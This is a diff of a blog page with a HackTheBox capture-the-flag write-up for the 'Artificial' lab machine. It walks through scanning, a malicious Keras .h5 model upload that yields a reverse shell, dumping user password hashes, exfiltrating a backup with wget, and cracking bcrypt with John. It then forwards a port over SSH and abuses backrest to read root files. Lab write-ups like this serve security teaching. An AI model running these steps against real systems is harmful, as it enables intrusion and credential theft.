@@ -1,59 +1,55 @@
 <!DOCTYPE html>
 <html lang="en-us">
 <head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>HackTheBox: Artificial | 0xD3f3c7</title>
-    <meta name="viewport" content="width=device-width,minimum-scale=1">
-    <meta name="description" content="HackTheBox Artificial writeup">
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<title>HackTheBox: Artificial | 0xD3f3c7</title>
+<meta name="viewport" content="width=device-width,minimum-scale=1">
+<meta name="description" content="HackTheBox Artificial writeup">
 
-    <style>
-        /* Center content like Notion */
-        body {
-            background-color: #f7f7f7;
-            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-        }
-        main {
-            max-width: 900px; /* narrow, Notion-like width */
-            margin: 0 auto; /* center horizontally */
-            padding: 2rem 1rem;
-            background: #ffffff;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
-        }
-        h1, h2, h3, h4 {
-            margin-top: 2rem;
-        }
-        pre {
-            background: #272822;
-            padding: 1rem;
-            overflow-x: auto;
-            border-radius: 5px;
-        }
-        code {
-            font-family: monospace;
-            color: #39ff14; /* neon green default */
-        }
-        /* Specific colors for keywords in Python / shell */
-        .keyword { color: #ff79c6; }   /* pink/purple keywords */
-        .builtin { color: #8be9fd; }   /* cyan built-ins */
-        .string { color: #f1fa8c; }    /* yellow strings */
-        .comment { color: #6272a4; font-style: italic; } /* grey comments */
-        .number { color: #bd93f9; }    /* purple numbers */
-        img {
-            max-width: 100%;
-            display: block;
-            margin: 1rem 0;
-        }
-        a {
-            color: #1a73e8;
-            text-decoration: none;
-        }
-        a:hover {
-            text-decoration: underline;
-        }
-    </style>
+<style>
+    body {
+        background-color: #f7f7f7;
+        font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+    }
+    main {
+        max-width: 900px;
+        margin: 0 auto;
+        padding: 2rem 1rem;
+        background: #ffffff;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+    }
+    h1, h2, h3, h4 {
+        margin-top: 2rem;
+    }
+    pre {
+        background: #272822;
+        padding: 1rem;
+        overflow-x: auto;
+        border-radius: 5px;
+    }
+    code {
+        font-family: monospace;
+        color: #39ff14; /* neon green default */
+    }
+    .keyword { color: #ff79c6; }
+    .builtin { color: #8be9fd; }
+    .string { color: #f1fa8c; }
+    .comment { color: #6272a4; font-style: italic; }
+    .number { color: #bd93f9; }
+    img {
+        max-width: 100%;
+        display: block;
+        margin: 1rem 0;
+    }
+    a {
+        color: #1a73e8;
+        text-decoration: none;
+    }
+    a:hover { text-decoration: underline; }
+</style>
 </head>
 <body>
 
@@ -65,46 +61,53 @@
 
 <main>
 <article>
-<h1>HackTheBox: Artificial</h1>
-<time datetime="2025-09-02T08:17:12-04:00">September 2, 2025</time>
 
-<h2>Port Scan</h2>
+<h1>HackTheBox: Artificial</h1>
+
+<h2>Reconnaissance</h2>
+
+<h3>Port Scan</h3>
 <pre><code>rustscan -a 10.10.11.74 -- -A | tee rustscan.log
 Open 10.10.11.74:22
 Open 10.10.11.74:80</code></pre>
 
-<h2>Identify Target and Add to Hosts File</h2>
-<p>URL: <a href="http://10.10.11.74">http://10.10.11.74</a></p>
+<h3>Identify Target and Add to Hosts File</h3>
+<pre><code>URL: http://10.10.11.74</code></pre>
+
 <p>Upon visiting the IP in a browser, we are redirected to:</p>
 <pre><code>http://artificial.htb</code></pre>
+
 <p>Add this domain to <code>/etc/hosts</code>:</p>
 <pre><code>sudo nano /etc/hosts
 10.10.11.74 artificial.htb</code></pre>
 
-<h2>Web Enumeration</h2>
+<h3>Web Enumeration</h3>
+<p>Login and registration pages:</p>
 <ul>
-<li>Login and registration pages:</li>
+<li><a href="http://artificial.htb/login">/login</a></li>
+<li><a href="http://artificial.htb/register">/register</a></li>
 </ul>
-<p><a href="http://artificial.htb/login">/login</a></p>
-<p><a href="http://artificial.htb/register">/register</a></p>
 <blockquote>Artificial is a platform that lets you easily build, test, and deploy AI models to solve real-world problems like sales forecasting.</blockquote>
 
-<h2>Directory Scan Using ffuf</h2>
+<h3>Directory Scan Using ffuf</h3>
 <pre><code>ffuf -u http://artificial.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt</code></pre>
-<pre><code>/login        [Status: 200]
-/register     [Status: 200]
-/logout       [Status: 302]
-/dashboard    [Status: 302]</code></pre>
+<pre><code>/login         [Status: 200]
+/register      [Status: 200]
+/logout        [Status: 302]
+/dashboard     [Status: 302]</code></pre>
 
-<h2>Registration</h2>
-<p>Register a new user at <code>/register</code>:</p>
+<h2>Initial Access</h2>
+
+<h3>Registration</h3>
+<p>Register a new user account at: <code>/register</code></p>
 <img src="artificialregister.png" alt="Register page">
 
-<h2>Login</h2>
-<p>Login using the credentials at <code>/login</code>:</p>
+<h3>Login</h3>
+<p>Login using the credentials at: <code>/login</code></p>
 <img src="artificiallogin.png" alt="Login page">
 
-<h2>Exploit: Malicious .h5 Upload</h2>
+<h3>Exploit: Malicious .h5 Upload</h3>
+<p>We noticed AI model uploads, so we craft a malicious <code>.h5</code> file using Python.</p>
 <pre><code><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf
 
 <span class="keyword">def</span> exploit(x):
@@ -117,58 +120,115 @@ model.add(tf.keras.layers.Input(shape=(<span class="number">64</span>,)))
 model.add(tf.keras.layers.Lambda(exploit))
 model.compile()
 model.save(<span class="string">"exploit.h5"</span>)</code></pre>
+
 <p>Upload <code>exploit.h5</code>:</p>
 <img src="artificialuploadmodel.png" alt="Upload model">
 
-<h2>Listener</h2>
+<h3>Listener</h3>
 <pre><code>nc -lvnp 6666</code></pre>
 
-<h2>Trigger Shell</h2>
+<h3>Trigger Shell</h3>
 <p>Click on view predictions:</p>
 <img src="viewpredicitons.png" alt="View predictions">
+
 <pre><code>python3 -c <span class="string">'import pty; pty.spawn("/bin/bash")'</span>
 [Ctrl+Z]
 stty raw -echo; fg
 export TERM=xterm</code></pre>
 
-<h2>Enumerate .db files</h2>
-<pre><code>find / -name <span class="string">"*.db*"</span> 2>/dev/null
+<h2>Post Exploitation</h2>
+
+<h3>Enumerate .db files</h3>
+<pre><code>find / -name "*.db*" 2>/dev/null
 sqlite3 /home/app/app/instance/users.db</code></pre>
+
 <p>Tables:</p>
 <pre><code>.tables
 SELECT * FROM user;</code></pre>
-<p>Example:</p>
+
+<p>Example result:</p>
 <pre><code>1|gael|gael@artificial.htb|HASH
 6|whoameye|whoameye@gmail.com|5f4dcc3b5aa765d61d8327deb882cf99</code></pre>
 
-<h2>Login as Gael</h2>
+<h3>Enumerate System Users</h3>
+<pre><code>cat /etc/passwd</code></pre>
+<p>Login as Gael:</p>
 <pre><code>su - gael
 cat ~/user.txt</code></pre>
 
-<h2>Confirm container</h2>
+<h3>Confirm Container</h3>
 <pre><code>hostname
 cat /etc/hosts
 find / -name container 2>/dev/null</code></pre>
 
 <h2>Host Enumeration</h2>
-<ul>
-<li>Search for backups</li>
-<li>Exfiltrate backup</li>
-<li>Analyze <code>backrest</code> files</li>
-<li>Crack passwords</li>
-</ul>
+
+<h3>Search for Backups</h3>
+<pre><code>find / -name "backups" 2>/dev/null
+cd /var/backups
+ls -la</code></pre>
+
+<p>Identify: <code>backrest_backup.tar.gz</code></p>
+
+<h3>Exfiltrate Backup</h3>
+<pre><code>python3 -m http.server 8000</code></pre>
+<p>From attacking machine:</p>
+<pre><code>wget http://artificial.htb:8000/backrest_backup.tar.gz
+tar -xvf backrest_backup.tar.gz</code></pre>
+
+<h3>Inside <code>backrest/</code></h3>
+<pre><code>cd backrest/.config/backrest
+cat config.json
+{
+  "modno": 2,
+  "version": 4,
+  "instance": "Artificial",
+  "auth": {
+    "disabled": false,
+    "users": [
+      {
+        "name": "backrest_root",
+        "passwordBcrypt": "HASH"
+      }
+    ]
+  }
+}
+</code></pre>
+
+<p>Crack hash using John:</p>
+<pre><code>echo &lt;hash&gt; | base64 -d &gt; hash.txt
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt</code></pre>
+
+<h3>Localhost Services</h3>
+<pre><code>netstat -tulnp</code></pre>
+
+<h3>SSH Port Forward</h3>
+<pre><code>ssh gael@10.10.11.74 -L 9898:127.0.0.1:9898</code></pre>
+
+<p>Navigate to: <code>http://127.0.0.1:9898/</code> and login with <code>backrest_root</code> and cracked password.</p>
 
 <h2>Privilege Escalation</h2>
+
+<h3>Add Repo and Run Backup</h3>
 <ul>
-<li>Add repo and run backup</li>
-<li>Dump snapshot files</li>
-<li>Root obtained</li>
+<li>help</li>
+<li>backup /root</li>
 </ul>
+<img src="helpbackrest.png" alt="help backrest">
+<img src="backuproot.png" alt="backup root">
+
+<h3>List Snapshot Files</h3>
+<img src="lssnapshot.png" alt="snapshot files">
+
+<h3>Dump Root File</h3>
+<pre><code>dump &lt;snapshot_id&gt; /root/root.txt</code></pre>
+
 <img src="fcde9198-a3ae-4ca9-a6cf-29a22afc115d.png" alt="Root obtained">
 
-<p>That wraps up my first HackTheBox writeup.</p>
-<p>Hope you learned something new!</p>
-<p>Happy hacking, 0xD3f3c7</p>
+<h2>Final Notes</h2>
+<p>That wraps up my first writeup for HackTheBox.</p>
+<p>Hope the writeup was helpful and you were able to learn something new.</p>
+<p>Happy hacking, whoameye</p>
 
 </article>
 </main>
